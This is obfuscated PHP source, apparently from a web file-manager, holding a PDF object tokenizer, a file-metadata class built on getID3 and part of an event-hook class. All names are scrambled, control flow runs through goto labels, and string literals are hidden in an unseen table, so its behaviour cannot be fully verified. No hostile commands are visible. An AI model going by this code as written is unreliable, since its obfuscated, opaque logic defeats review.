dôßÄ”ÜÏÙ: $Açİ­ƒÑ‘¦ =& $_SERVER[ì‹É]; $aƒ¼ÃÕ ÖÍ = $Açİ­ƒÑ‘¦[33]; $AñŞÔÈ±Ñ = $Açİ­ƒÑ‘¦[33]; goto A¾ˆæ„ƒ‚; A¾ˆæ„ƒ‚: $A‡Ç½˜ĞÍì += strspn($f³óæš¿İ, $Açİ­ƒÑ‘¦[1501], $A‡Ç½˜ĞÍì); $cÕ“¹÷ˆš = $f³óæš¿İ[$A‡Ç½˜ĞÍì]; switch ($cÕ“¹÷ˆš) { case $Açİ­ƒÑ‘¦[1502]: $fÊ¬ßÔ’øï = strcspn($f³óæš¿İ, $Açİ­ƒÑ‘¦[1503], $A‡Ç½˜ĞÍì); if ($fÊ¬ßÔ’øï > 0) { $A‡Ç½˜ĞÍì += $fÊ¬ßÔ’øï; return self::getRawObject($f³óæš¿İ, $A‡Ç½˜ĞÍì); } break; case $Açİ­ƒÑ‘¦[8]: $aƒ¼ÃÕ ÖÍ = $cÕ“¹÷ˆš; ++$A‡Ç½˜ĞÍì; $F‡Í†Ûò½ = preg_match($Açİ­ƒÑ‘¦[1504], substr($f³óæš¿İ, $A‡Ç½˜ĞÍì, 256), $e¿š¦µßÕÆ); if (1 == $F‡Í†Ûò½) { $AñŞÔÈ±Ñ = $e¿š¦µßÕÆ[1]; $A‡Ç½˜ĞÍì += strlen($AñŞÔÈ±Ñ); } break; case $Açİ­ƒÑ‘¦[245]: case $Açİ­ƒÑ‘¦[813]: $aƒ¼ÃÕ ÖÍ = $cÕ“¹÷ˆš; ++$A‡Ç½˜ĞÍì; $f…§®£±šô = $A‡Ç½˜ĞÍì; if ($Açİ­ƒÑ‘¦[245] == $cÕ“¹÷ˆš) { $A½ÔÈÒÊî÷ = 1; while ($A½ÔÈÒÊî÷ > 0) { if (!isset($f³óæš¿İ[$f…§®£±šô])) { break; } $b‚ÑŠæñå = $f³óæš¿İ[$f…§®£±šô]; switch ($b‚ÑŠæñå) { case $Açİ­ƒÑ‘¦[96]: ++$f…§®£±šô; break; case $Açİ­ƒÑ‘¦[245]: ++$A½ÔÈÒÊî÷; break; case $Açİ­ƒÑ‘¦[813]: --$A½ÔÈÒÊî÷; break; } ++$f…§®£±šô; } $AñŞÔÈ±Ñ = substr($f³óæš¿İ, $A‡Ç½˜ĞÍì, $f…§®£±šô - $A‡Ç½˜ĞÍì - 1); $A‡Ç½˜ĞÍì = $f…§®£±šô; } break; case $Açİ­ƒÑ‘¦[154]: case $Açİ­ƒÑ‘¦[468]: $aƒ¼ÃÕ ÖÍ = $cÕ“¹÷ˆš; ++$A‡Ç½˜ĞÍì; if ($Açİ­ƒÑ‘¦[154] == $cÕ“¹÷ˆš) { $AñŞÔÈ±Ñ = array(); do { $aï¯°ğ‹ˆä = $A‡Ç½˜ĞÍì; $bÔÖ…×è = self::getRawObject($f³óæš¿İ, $A‡Ç½˜ĞÍì); $A‡Ç½˜ĞÍì = $bÔÖ…×è[2]; $AñŞÔÈ±Ñ[] = $bÔÖ…×è; } while ($Açİ­ƒÑ‘¦[468] != $bÔÖ…×è[0] && $A‡Ç½˜ĞÍì != $aï¯°ğ‹ˆä); array_pop($AñŞÔÈ±Ñ); } break; case $Açİ­ƒÑ‘¦[922]: case $Açİ­ƒÑ‘¦[925]: if (isset($f³óæš¿İ[$A‡Ç½˜ĞÍì + 1]) && $f³óæš¿İ[$A‡Ç½˜ĞÍì + 1] == $cÕ“¹÷ˆš) { $aƒ¼ÃÕ ÖÍ = $cÕ“¹÷ˆš . $cÕ“¹÷ˆš; $A‡Ç½˜ĞÍì += 2; if ($Açİ­ƒÑ‘¦[922] == $cÕ“¹÷ˆš) { $AñŞÔÈ±Ñ = array(); do { $aï¯°ğ‹ˆä = $A‡Ç½˜ĞÍì; $bÔÖ…×è = self::getRawObject($f³óæš¿İ, $A‡Ç½˜ĞÍì); $A‡Ç½˜ĞÍì = $bÔÖ…×è[2]; $AñŞÔÈ±Ñ[] = $bÔÖ…×è; } while ($Açİ­ƒÑ‘¦[1505] != $bÔÖ…×è[0] && $A‡Ç½˜ĞÍì != $aï¯°ğ‹ˆä); array_pop($AñŞÔÈ±Ñ); } } else { $aƒ¼ÃÕ ÖÍ = $cÕ“¹÷ˆš; ++$A‡Ç½˜ĞÍì; $F‡Í†Ûò½ = preg_match($Açİ­ƒÑ‘¦[1506], substr($f³óæš¿İ, $A‡Ç½˜ĞÍì), $e¿š¦µßÕÆ); if ($Açİ­ƒÑ‘¦[922] == $cÕ“¹÷ˆš && 1 == $F‡Í†Ûò½) { $AñŞÔÈ±Ñ = strtr($e¿š¦µßÕÆ[1], $Açİ­ƒÑ‘¦[1507], $Açİ­ƒÑ‘¦[33]); $A‡Ç½˜ĞÍì += \strlen($e¿š¦µßÕÆ[0]); } elseif (!1 !== ($b´óÃƒÔ°ï = strpos($f³óæš¿İ, $Açİ­ƒÑ‘¦[925], $A‡Ç½˜ĞÍì))) { $A‡Ç½˜ĞÍì = $b´óÃƒÔ°ï + 1; } } break; default: if ($Açİ­ƒÑ‘¦[1508] == substr($f³óæš¿İ, $A‡Ç½˜ĞÍì, 6)) { $aƒ¼ÃÕ ÖÍ = $Açİ­ƒÑ‘¦[1508]; $A‡Ç½˜ĞÍì += 6; } elseif ($Açİ­ƒÑ‘¦[102] == substr($f³óæš¿İ, $A‡Ç½˜ĞÍì, 4)) { $aƒ¼ÃÕ ÖÍ = $Açİ­ƒÑ‘¦[102]; $A‡Ç½˜ĞÍì += 4; $AñŞÔÈ±Ñ = $Açİ­ƒÑ‘¦[102]; } elseif ($Açİ­ƒÑ‘¦[1509] == substr($f³óæš¿İ, $A‡Ç½˜ĞÍì, 4)) { $aƒ¼ÃÕ ÖÍ = $Açİ­ƒÑ‘¦[1510]; $A‡Ç½˜ĞÍì += 4; $AñŞÔÈ±Ñ = $Açİ­ƒÑ‘¦[1509]; } elseif ($Açİ­ƒÑ‘¦[1511] == substr($f³óæš¿İ, $A‡Ç½˜ĞÍì, 5)) { $aƒ¼ÃÕ ÖÍ = $Açİ­ƒÑ‘¦[1510]; $A‡Ç½˜ĞÍì += 5; $AñŞÔÈ±Ñ = $Açİ­ƒÑ‘¦[1511]; } elseif ($Açİ­ƒÑ‘¦[998] == substr($f³óæš¿İ, $A‡Ç½˜ĞÍì, 6)) { $aƒ¼ÃÕ ÖÍ = $Açİ­ƒÑ‘¦[998]; $A‡Ç½˜ĞÍì += 6; if (1 == preg_match($Açİ­ƒÑ‘¦[1512], substr($f³óæš¿İ, $A‡Ç½˜ĞÍì), $e¿š¦µßÕÆ)) { $A‡Ç½˜ĞÍì += strlen($e¿š¦µßÕÆ[0]); $a”ïÛù‡¤Ç = $Açİ­ƒÑ‘¦[1513]; $F‡Í†Ûò½ = preg_match($a”ïÛù‡¤Ç, substr($f³óæš¿İ, $A‡Ç½˜ĞÍì), $e¿š¦µßÕÆ, PREG_OFFSET_CAPTURE); if (1 == $F‡Í†Ûò½) { $AñŞÔÈ±Ñ = substr($f³óæš¿İ, $A‡Ç½˜ĞÍì, $e¿š¦µßÕÆ[0][1]); $A‡Ç½˜ĞÍì += $e¿š¦µßÕÆ[1][1]; } } } elseif ($Açİ­ƒÑ‘¦[1514] == substr($f³óæš¿İ, $A‡Ç½˜ĞÍì, 9)) { $aƒ¼ÃÕ ÖÍ = $Açİ­ƒÑ‘¦[1514]; $A‡Ç½˜ĞÍì += 9; } elseif (1 == preg_match($Açİ­ƒÑ‘¦[1515], substr($f³óæš¿İ, $A‡Ç½˜ĞÍì, 33), $e¿š¦µßÕÆ)) { $aƒ¼ÃÕ ÖÍ = $Açİ­ƒÑ‘¦[1478]; $A‡Ç½˜ĞÍì += strlen($e¿š¦µßÕÆ[0]); $AñŞÔÈ±Ñ = intval($e¿š¦µßÕÆ[1]) . $Açİ­ƒÑ‘¦[71] . intval($e¿š¦µßÕÆ[2]); } elseif (1 == preg_match($Açİ­ƒÑ‘¦[1516], substr($f³óæš¿İ, $A‡Ç½˜ĞÍì, 33), $e¿š¦µßÕÆ)) { $aƒ¼ÃÕ ÖÍ = $Açİ­ƒÑ‘¦[1517]; $AñŞÔÈ±Ñ = intval($e¿š¦µßÕÆ[1]) . $Açİ­ƒÑ‘¦[71] . intval($e¿š¦µßÕÆ[2]); $A‡Ç½˜ĞÍì += strlen($e¿š¦µßÕÆ[0]); } elseif (($e¤œ³ ”¨„ = strspn($f³óæš¿İ, $Açİ­ƒÑ‘¦[1518], $A‡Ç½˜ĞÍì)) > 0) { $aƒ¼ÃÕ ÖÍ = $Açİ­ƒÑ‘¦[1519]; $AñŞÔÈ±Ñ = substr($f³óæš¿İ, $A‡Ç½˜ĞÍì, $e¤œ³ ”¨„); $A‡Ç½˜ĞÍì += $e¤œ³ ”¨„; } break; } goto cÉÂÊƒò¦¢; FÜ©ìÛ½Ü: } } class GetInfo { private static $fileTypeArray; public static function get($AÒóäë‚Ò‰) { $DÆ±ä¯é‚ = IO::info($AÒóäë‚Ò‰); return self::infoAdd($DÆ±ä¯é‚); } public static function infoAdd(&$FÂº¯ÉÅ‡é) { goto F‡‡ïÈä  ; FÛõ¼òÅ¿§: $F•‡‡‰Õ£¹ = $FÂº¯ÉÅ‡é[$A¡ÛáëˆË”[157]]; try { if ($FÂº¯ÉÅ‡é[$A¡ÛáëˆË”[157]] == $A¡ÛáëˆË”[1522]) { $aƒ ô¶Š«Î = self::psdParse($fåÔ‚ªæ”¯); $F•‡‡‰Õ£¹ = $A¡ÛáëˆË”[1523]; } else { if ($FÂº¯ÉÅ‡é[$A¡ÛáëˆË”[157]] == $A¡ÛáëˆË”[1524]) { $aƒ ô¶Š«Î = self::pdfParse($fåÔ‚ªæ”¯); } else { $F•‡‡‰Õ£¹ = self::$fileTypeArray[$A¡ÛáëˆË”[1525]][$FÂº¯ÉÅ‡é[$A¡ÛáëˆË”[157]]]; $a®ÑÓŸã¡ = self::$fileTypeArray[$A¡ÛáëˆË”[1526]][$F•‡‡‰Õ£¹][$A¡ÛáëˆË”[1527]]; $c‚ºĞœîõë = @$Bñ…§¿—ºæ->analyze($fåÔ‚ªæ”¯, $FÂº¯ÉÅ‡é[$A¡ÛáëˆË”[78]], $FÂº¯ÉÅ‡é[$A¡ÛáëˆË”[28]]); $aƒ ô¶Š«Î = self::parseData($c‚ºĞœîõë, $a®ÑÓŸã¡, $FÂº¯ÉÅ‡é); } } } catch (Exception $e¥Ï Èã¦) { $aƒ ô¶Š«Î = array($A¡ÛáëˆË”[369] => $F•‡‡‰Õ£¹); } if (!$aƒ ô¶Š«Î) { return; } goto bË†éù’Ş…; bË†éù’Ş…: $aƒ ô¶Š«Î[$A¡ÛáëˆË”[369]] = $F•‡‡‰Õ£¹; $FÂº¯ÉÅ‡é[$A¡ÛáëˆË”[422]] = $aƒ ô¶Š«Î; return $FÂº¯ÉÅ‡é; goto cÛÀ†¨‡²; F‡‡ïÈä  : $A¡ÛáëˆË” =& $_SERVER[ì‹É]; static $Bñ…§¿—ºæ; if (!$Bñ…§¿—ºæ) { require SDK_DIR . $A¡ÛáëˆË”[1520]; $Bñ…§¿—ºæ = new getID3(); } goto bƒÑÊ‹İ…¶; bƒÑÊ‹İ…¶: if (!$FÂº¯ÉÅ‡é || $FÂº¯ÉÅ‡é[$A¡ÛáëˆË”[29]] != $A¡ÛáëˆË”[164]) { return; } if (!self::support($FÂº¯ÉÅ‡é[$A¡ÛáëˆË”[157]]) || isset($FÂº¯ÉÅ‡é[$A¡ÛáëˆË”[422]])) { return; } $fåÔ‚ªæ”¯ = $A¡ÛáëˆË”[1521] . $FÂº¯ÉÅ‡é[$A¡ÛáëˆË”[76]]; goto FÛõ¼òÅ¿§; cÛÀ†¨‡²: } public static function support($FÖŠŒºÚ°™) { goto e££œÁœØÓ; d¥”êáèİÏ: return !1; goto bÅéÙõÏ›; e££œÁœØÓ: $cÕ·©â¨Š =& $_SERVER[ì‹É]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $FÖŠŒºÚ°™ = strtolower($FÖŠŒºÚ°™); goto Aë»˜·ø; Aë»˜·ø: $E³ÖâŞÙö = array($cÕ·©â¨Š[1524], $cÕ·©â¨Š[1522]); if (in_array($FÖŠŒºÚ°™, $E³ÖâŞÙö)) { return !0; } if (isset(self::$fileTypeArray[$cÕ·©â¨Š[1525]][$FÖŠŒºÚ°™])) { return !0; } goto d¥”êáèİÏ; bÅéÙõÏ›: } private static function parseData($B·³„ƒ£ò, $E÷ŸíŒŞ, $f’‡¿…º·˜) { $fÛøĞ×’Æò =& $_SERVER[ì‹É]; $c²¼î½»Í = $B·³„ƒ£ò[$fÛøĞ×’Æò[1528]]; $F¸Î˜¾Ï¨ = array(); foreach ($E÷ŸíŒŞ as $a—ö·ó”Êµ => $cå•¼ïÀÑ‡) { foreach ($cå•¼ïÀÑ‡ as $c´ÄÌ™¬ôõ) { if (is_array($c´ÄÌ™¬ôõ)) { $cÇ÷›•±† = self::parseData($B·³„ƒ£ò, $cå•¼ïÀÑ‡, $f’‡¿…º·˜); if ($cÇ÷›•±†) { $F¸Î˜¾Ï¨[$a—ö·ó”Êµ] = $cÇ÷›•±†; } break; } $AõÍ‰©Öœ© = str_replace($fÛøĞ×’Æò[1306], $c²¼î½»Í, $c´ÄÌ™¬ôõ); $cÇ÷›•±† = _get($B·³„ƒ£ò, $AõÍ‰©Öœ©); $cÇ÷›•±† = is_array($cÇ÷›•±†) ? $cÇ÷›•±†[0] : $cÇ÷›•±†; if ($cÇ÷›•±†) { break; } } if ($cÇ÷›•±† || $cÇ÷›•±† === 0 || $cÇ÷›•±† === !1) { $cÇ÷›•±† = self::valueReset($c´ÄÌ™¬ôõ, $cÇ÷›•±†, $a—ö·ó”Êµ); if ($cÇ÷›•±† !== null) { $F¸Î˜¾Ï¨[$a—ö·ó”Êµ] = $cÇ÷›•±†; } } } $F¸Î˜¾Ï¨ = self::valueResetAll($F¸Î˜¾Ï¨, $f’‡¿…º·˜); return $F¸Î˜¾Ï¨; } private static function psdParse($eÆì†ŞÙÏ) { $b¤¬õ‡²…Ä =& $_SERVER[ì‹É]; if (IO::fileSubstr($eÆì†ŞÙÏ, 0, 4) != $b¤¬õ‡²…Ä[1529]) { return !1; } $bÂÉÅÊáä = getImageSize($eÆì†ŞÙÏ, $Dò¾ø—¯ï); if (!$bÂÉÅÊáä) { return; } $cš‘£ÁÎ† = array($b¤¬õ‡²…Ä[1445] => $bÂÉÅÊáä[0], $b¤¬õ‡²…Ä[1447] => $bÂÉÅÊáä[1]); return $cš‘£ÁÎ†; } private static function pdfParse($f÷àìŸ¥à‘) { return FileParsePdf::parse($f÷àìŸ¥à‘); } private static function fileTypeParse() { $dÀæÜÅ·¬ =& $_SERVER[ì‹É]; $cÙóóˆ = self::fileTypeArray(); $D×ÃƒÓ¿Ø = array(); foreach ($cÙóóˆ as $E˜Ã°”´ => $AÅö†„È…) { $BÎ«“øŸ = _get($AÅö†„È…, $dÀæÜÅ·¬[157], $dÀæÜÅ·¬[33]); $fõ‚×Îò˜° = is_string($BÎ«“øŸ) ? explode($dÀæÜÅ·¬[47], $BÎ«“øŸ) : $BÎ«“øŸ; if (!$fõ‚×Îò˜°) { continue; } foreach ($fõ‚×Îò˜° as $BÎ«“øŸ) { $BÎ«“øŸ = strtolower(trim($BÎ«“øŸ)); if (!$BÎ«“øŸ) { continue; } $D×ÃƒÓ¿Ø[$BÎ«“øŸ] = $E˜Ã°”´; } $cÙóóˆ[$E˜Ã°”´][$dÀæÜÅ·¬[157]] = array_keys($D×ÃƒÓ¿Ø); $cÙóóˆ[$E˜Ã°”´][$dÀæÜÅ·¬[1527]] = self::parseKeyMap($AÅö†„È…[$dÀæÜÅ·¬[1527]]); } return array($dÀæÜÅ·¬[1526] => $cÙóóˆ, $dÀæÜÅ·¬[1525] => $D×ÃƒÓ¿Ø); } private static function parseKeyMap($b…ÛÏò­‚Ã) { $E‡ĞÃ¤Ø³ =& $_SERVER[ì‹É]; foreach ($b…ÛÏò­‚Ã as $fˆâ÷†·ª™ => $cöÛ©ï¥êµ) { if (is_array($cöÛ©ï¥êµ)) { $AÁ™‹êŞ = self::parseKeyMap($cöÛ©ï¥êµ); if ($AÁ™‹êŞ) { $b…ÛÏò­‚Ã[$fˆâ÷†·ª™] = $AÁ™‹êŞ; } continue; } $c˜äï¹ ¥‰ = explode($E‡ĞÃ¤Ø³[47], $cöÛ©ï¥êµ); $fÎ±ÊŒÒ·Ü = array(); foreach ($c˜äï¹ ¥‰ as $f®ãç¿¯ÜÓ) { $f®ãç¿¯ÜÓ = trim($f®ãç¿¯ÜÓ); if (!$f®ãç¿¯ÜÓ) { continue; } if (preg_match($E‡ĞÃ¤Ø³[1530], $f®ãç¿¯ÜÓ, $cË‰¥ËÄ×)) { $fŞÄÅ…¥Ë = explode($E‡ĞÃ¤Ø³[268], $cË‰¥ËÄ×[1]); foreach ($fŞÄÅ…¥Ë as $A×±Ğñ»õ’) { $fÎ±ÊŒÒ·Ü[] = str_replace($cË‰¥ËÄ×[0], $A×±Ğñ»õ’, $f®ãç¿¯ÜÓ); } } else { $fÎ±ÊŒÒ·Ü[] = $f®ãç¿¯ÜÓ; } } $b…ÛÏò­‚Ã[$fˆâ÷†·ª™] = $fÎ±ÊŒÒ·Ü; } return $b…ÛÏò­‚Ã; } private static function valueResetAll($e„¸¥ºê•£, $FãÜ·ª‰ª‰) { goto Fìõ¦¿ìƒ×; AÏé•ÒÆĞˆ: return $e„¸¥ºê•£; goto F—µ¸±Ä¯; c„¶œ¸½«Ğ: if ($cºÎÇ‚¸¡) { $d– ßã¥±ã = IO_PATH_SYSTEM_TEMP . $BÅ§ÊƒÎÛŒ[1536] . KodIO::hashPath($FãÜ·ª‰ª‰) . $BÅ§ÊƒÎÛŒ[1537]; $e„¸¥ºê•£[$BÅ§ÊƒÎÛŒ[1538]] = Action($BÅ§ÊƒÎÛŒ[1539])->pluginCacheFileSet($d– ßã¥±ã, $cºÎÇ‚¸¡); unset($e„¸¥ºê•£[$BÅ§ÊƒÎÛŒ[1540]][$BÅ§ÊƒÎÛŒ[1523]]); } $d°‹›œòš¹ = _get($e„¸¥ºê•£, $BÅ§ÊƒÎÛŒ[1541], $BÅ§ÊƒÎÛŒ[33]); $eÊÖœŒ†— = _get($e„¸¥ºê•£, $BÅ§ÊƒÎÛŒ[1542], $BÅ§ÊƒÎÛŒ[33]); goto fÄÏ¯™ÄÏ; Fìõ¦¿ìƒ×: $BÅ§ÊƒÎÛŒ =& $_SERVER[ì‹É]; if (isset($e„¸¥ºê•£[$BÅ§ÊƒÎÛŒ[1531]])) { $E¾†„ÄÌí” = ceil($e„¸¥ºê•£[$BÅ§ÊƒÎÛŒ[1531]]); $dÎ…÷Ç„âÍ = intval($E¾†„ÄÌí” / 3600); $aÆªÌ»à‡  = intval(($E¾†„ÄÌí” - $dÎ…÷Ç„âÍ * 3600) / 60); $cÚ³ç• ò“ = $E¾†„ÄÌí” % 60; $e„¸¥ºê•£[$BÅ§ÊƒÎÛŒ[1532]] = sprintf($BÅ§ÊƒÎÛŒ[1533], $dÎ…÷Ç„âÍ, $aÆªÌ»à‡ , $cÚ³ç• ò“); if ($dÎ…÷Ç„âÍ == 0) { $e„¸¥ºê•£[$BÅ§ÊƒÎÛŒ[1532]] = sprintf($BÅ§ÊƒÎÛŒ[1534], $aÆªÌ»à‡ , $cÚ³ç• ò“); } } $cºÎÇ‚¸¡ = _get($e„¸¥ºê•£, $BÅ§ÊƒÎÛŒ[1535]); goto c„¶œ¸½«Ğ; fÄÏ¯™ÄÏ: $B‹õ‘Ô”¸Å = _get($e„¸¥ºê•£, $BÅ§ÊƒÎÛŒ[1543], $BÅ§ÊƒÎÛŒ[33]); $B¾ÊÊô­è¯ = $d°‹›œòš¹ . $eÊÖœŒ†— . $B‹õ‘Ô”¸Å; if ($B¾ÊÊô­è¯ && get_charset($B¾ÊÊô­è¯) != $BÅ§ÊƒÎÛŒ[323]) { $e„¸¥ºê•£[$BÅ§ÊƒÎÛŒ[1540]][$BÅ§ÊƒÎÛŒ[1248]] = iconv_to($e„¸¥ºê•£[$BÅ§ÊƒÎÛŒ[1540]][$BÅ§ÊƒÎÛŒ[1248]], get_charset($B¾ÊÊô­è¯), $BÅ§ÊƒÎÛŒ[323]); $e„¸¥ºê•£[$BÅ§ÊƒÎÛŒ[1540]][$BÅ§ÊƒÎÛŒ[1544]] = iconv_to($e„¸¥ºê•£[$BÅ§ÊƒÎÛŒ[1540]][$BÅ§ÊƒÎÛŒ[1544]], get_charset($B¾ÊÊô­è¯), $BÅ§ÊƒÎÛŒ[323]); $e„¸¥ºê•£[$BÅ§ÊƒÎÛŒ[1540]][$BÅ§ÊƒÎÛŒ[1545]] = iconv_to($e„¸¥ºê•£[$BÅ§ÊƒÎÛŒ[1540]][$BÅ§ÊƒÎÛŒ[1545]], get_charset($B¾ÊÊô­è¯), $BÅ§ÊƒÎÛŒ[323]); } goto AÏé•ÒÆĞˆ; F—µ¸±Ä¯: } private static function valueReset($b¡†ö§ìè, $eš‰¦½òÃŞ, $a£òŠºëë­) { $BÅè·ç‰²¾ =& $_SERVER[ì‹É]; $F±Ú•ñôï = $BÅè·ç‰²¾[1462]; switch ($b¡†ö§ìè) { case $BÅè·ç‰²¾[1546]: $eš‰¦½òÃŞ = $eš‰¦½òÃŞ == $BÅè·ç‰²¾[84] ? $BÅè·ç‰²¾[1547] : $BÅè·ç‰²¾[1548]; break; case $BÅè·ç‰²¾[1549]: $eš‰¦½òÃŞ = $eš‰¦½òÃŞ ? $eš‰¦½òÃŞ : null; break; default: break; } switch ($a£òŠºëë­) { case $BÅè·ç‰²¾[1550]: $eš‰¦½òÃŞ = round($eš‰¦½òÃŞ, 2); break; case $BÅè·ç‰²¾[184]: case $BÅè·ç‰²¾[108]: if ($eš‰¦½òÃŞ < 0) { $eš‰¦½òÃŞ = null; } else { if (is_numeric($eš‰¦½òÃŞ)) { $eš‰¦½òÃŞ = date($F±Ú•ñôï, $eš‰¦½òÃŞ); } } break; default: break; } return $eš‰¦½òÃŞ; } private static function fileTypeArray() { $aƒÙÇ‚ø”Á =& $_SERVER[ì‹É]; return array($aƒÙÇ‚ø”Á[1523] => array($aƒÙÇ‚ø”Á[157] => $aƒÙÇ‚ø”Á[1551] . $aƒÙÇ‚ø”Á[1552], $aƒÙÇ‚ø”Á[1527] => array($aƒÙÇ‚ø”Á[1445] => $aƒÙÇ‚ø”Á[1553], $aƒÙÇ‚ø”Á[1447] => $aƒÙÇ‚ø”Á[1554], $aƒÙÇ‚ø”Á[1555] => $aƒÙÇ‚ø”Á[1556], $aƒÙÇ‚ø”Á[1557] => $aƒÙÇ‚ø”Á[1558], $aƒÙÇ‚ø”Á[184] => $aƒÙÇ‚ø”Á[1559], $aƒÙÇ‚ø”Á[108] => $aƒÙÇ‚ø”Á[1560], $aƒÙÇ‚ø”Á[1561] => $aƒÙÇ‚ø”Á[1562], $aƒÙÇ‚ø”Á[1563] => $aƒÙÇ‚ø”Á[1564], $aƒÙÇ‚ø”Á[1565] => $aƒÙÇ‚ø”Á[1566], $aƒÙÇ‚ø”Á[1567] => $aƒÙÇ‚ø”Á[1568], $aƒÙÇ‚ø”Á[1569] => $aƒÙÇ‚ø”Á[1570], $aƒÙÇ‚ø”Á[1571] => $aƒÙÇ‚ø”Á[1572], $aƒÙÇ‚ø”Á[1573] => $aƒÙÇ‚ø”Á[1574], $aƒÙÇ‚ø”Á[1575] => array($aƒÙÇ‚ø”Á[1576] => $aƒÙÇ‚ø”Á[1577], $aƒÙÇ‚ø”Á[1578] => $aƒÙÇ‚ø”Á[1579], $aƒÙÇ‚ø”Á[1580] => $aƒÙÇ‚ø”Á[1581]), $aƒÙÇ‚ø”Á[1582] => $aƒÙÇ‚ø”Á[1583], $aƒÙÇ‚ø”Á[1584] => $aƒÙÇ‚ø”Á[1585], $aƒÙÇ‚ø”Á[1586] => $aƒÙÇ‚ø”Á[1587], $aƒÙÇ‚ø”Á[1588] => $aƒÙÇ‚ø”Á[1589], $aƒÙÇ‚ø”Á[1590] => array($aƒÙÇ‚ø”Á[1591] => $aƒÙÇ‚ø”Á[1592], $aƒÙÇ‚ø”Á[1593] => $aƒÙÇ‚ø”Á[1594], $aƒÙÇ‚ø”Á[1595] => $aƒÙÇ‚ø”Á[1596], $aƒÙÇ‚ø”Á[1597] => $aƒÙÇ‚ø”Á[1598], $aƒÙÇ‚ø”Á[1599] => $aƒÙÇ‚ø”Á[1600], $aƒÙÇ‚ø”Á[1601] => $aƒÙÇ‚ø”Á[1602], $aƒÙÇ‚ø”Á[1603] => $aƒÙÇ‚ø”Á[1604], $aƒÙÇ‚ø”Á[1605] => $aƒÙÇ‚ø”Á[1606], $aƒÙÇ‚ø”Á[1607] => $aƒÙÇ‚ø”Á[1608], $aƒÙÇ‚ø”Á[1609] => $aƒÙÇ‚ø”Á[1610], $aƒÙÇ‚ø”Á[1611] => $aƒÙÇ‚ø”Á[1612]))), $aƒÙÇ‚ø”Á[1613] => array($aƒÙÇ‚ø”Á[157] => $aƒÙÇ‚ø”Á[1614] . $aƒÙÇ‚ø”Á[1615], $aƒÙÇ‚ø”Á[1527] => array($aƒÙÇ‚ø”Á[1531] => $aƒÙÇ‚ø”Á[1616], $aƒÙÇ‚ø”Á[184] => $aƒÙÇ‚ø”Á[1617], $aƒÙÇ‚ø”Á[108] => $aƒÙÇ‚ø”Á[1618], $aƒÙÇ‚ø”Á[1563] => $aƒÙÇ‚ø”Á[1619], $aƒÙÇ‚ø”Á[1620] => $aƒÙÇ‚ø”Á[1621], $aƒÙÇ‚ø”Á[1622] => $aƒÙÇ‚ø”Á[1549], $aƒÙÇ‚ø”Á[1623] => $aƒÙÇ‚ø”Á[1624], $aƒÙÇ‚ø”Á[1625] => $aƒÙÇ‚ø”Á[1626], $aƒÙÇ‚ø”Á[1627] => $aƒÙÇ‚ø”Á[1628], $aƒÙÇ‚ø”Á[1540] => array($aƒÙÇ‚ø”Á[1248] => $aƒÙÇ‚ø”Á[1629], $aƒÙÇ‚ø”Á[1544] => $aƒÙÇ‚ø”Á[1630], $aƒÙÇ‚ø”Á[1545] => $aƒÙÇ‚ø”Á[1631], $aƒÙÇ‚ø”Á[1632] => $aƒÙÇ‚ø”Á[1633], $aƒÙÇ‚ø”Á[1634] => $aƒÙÇ‚ø”Á[1635], $aƒÙÇ‚ø”Á[1636] => $aƒÙÇ‚ø”Á[1637], $aƒÙÇ‚ø”Á[1523] => $aƒÙÇ‚ø”Á[1638]))), $aƒÙÇ‚ø”Á[1639] => array($aƒÙÇ‚ø”Á[157] => $aƒÙÇ‚ø”Á[1640] . $aƒÙÇ‚ø”Á[1641], $aƒÙÇ‚ø”Á[1527] => array($aƒÙÇ‚ø”Á[1445] => $aƒÙÇ‚ø”Á[1642], $aƒÙÇ‚ø”Á[1447] => $aƒÙÇ‚ø”Á[1643], $aƒÙÇ‚ø”Á[1531] => $aƒÙÇ‚ø”Á[1616], $aƒÙÇ‚ø”Á[184] => $aƒÙÇ‚ø”Á[1644], $aƒÙÇ‚ø”Á[108] => $aƒÙÇ‚ø”Á[1645], $aƒÙÇ‚ø”Á[1550] => $aƒÙÇ‚ø”Á[1646], $aƒÙÇ‚ø”Á[1627] => $aƒÙÇ‚ø”Á[1647], $aƒÙÇ‚ø”Á[1623] => $aƒÙÇ‚ø”Á[1648], $aƒÙÇ‚ø”Á[1563] => $aƒÙÇ‚ø”Á[1649], $aƒÙÇ‚ø”Á[1613] => array($aƒÙÇ‚ø”Á[1622] => $aƒÙÇ‚ø”Á[1549], $aƒÙÇ‚ø”Á[1650] => $aƒÙÇ‚ø”Á[1651], $aƒÙÇ‚ø”Á[1620] => $aƒÙÇ‚ø”Á[1621], $aƒÙÇ‚ø”Á[1627] => $aƒÙÇ‚ø”Á[1628], $aƒÙÇ‚ø”Á[1623] => $aƒÙÇ‚ø”Á[1652], $aƒÙÇ‚ø”Á[1625] => $aƒÙÇ‚ø”Á[1626]))), $aƒÙÇ‚ø”Á[1653] => array($aƒÙÇ‚ø”Á[1527] => array($aƒÙÇ‚ø”Á[1654] => $aƒÙÇ‚ø”Á[1655], $aƒÙÇ‚ø”Á[1656] => $aƒÙÇ‚ø”Á[1657])), $aƒÙÇ‚ø”Á[1658] => array($aƒÙÇ‚ø”Á[1527] => array())); } } class Hook { private static $events = array(); public static function get($eÉ¤””‹ô¸ = false) { if (!$eÉ¤””‹ô¸) { return self::$events; } else { return self::$events[$eÉ¤””‹ô¸]; } } public static function apply($AçÒÍ¸¶ˆ, $bàÓå ¤Ç¸ = array()) { $eƒÊ´Êé¶ = ActionApply($AçÒÍ¸¶ˆ, $bàÓå ¤Ç¸); if (is_string($AçÒÍ¸¶ˆ)) { Hook::trigger($AçÒÍ¸¶ˆ); } return $eƒÊ´Êé¶; } public static function bind($c•íŠÈù±™, $a›²‰Û‘, $a÷É‡”ÒîÁ = false) { $AÄñğÑë© =& $_SERVER[ì‹É]; if (!isset(self::$events[$c•íŠÈù±™])) { self::$events[$c•íŠÈù±™] = array(); } self::$events[$c•íŠÈù±™][] = array($AÄñğÑë©[1659] => $a›²‰Û‘, $AÄñğÑë©[1660] => $a÷É‡”ÒîÁ, $AÄñğÑë©[1661] => 0); } public static function once($D×§íÜÛÔ, $f£ãòÇÄ”) { self::bind($D×§íÜÛÔ, $f£ãòÇÄ”, !0); } public static function unbind($F÷ÏõÕáÀ¨, $dó–±ÕºÌ˜ = false) { if (!$dó–±ÕºÌ˜) { self::$events[$F÷ÏõÕáÀ¨] = array(); return; } $f“–´›ää¹ = self::$events[$F÷ÏõÕáÀ¨]; 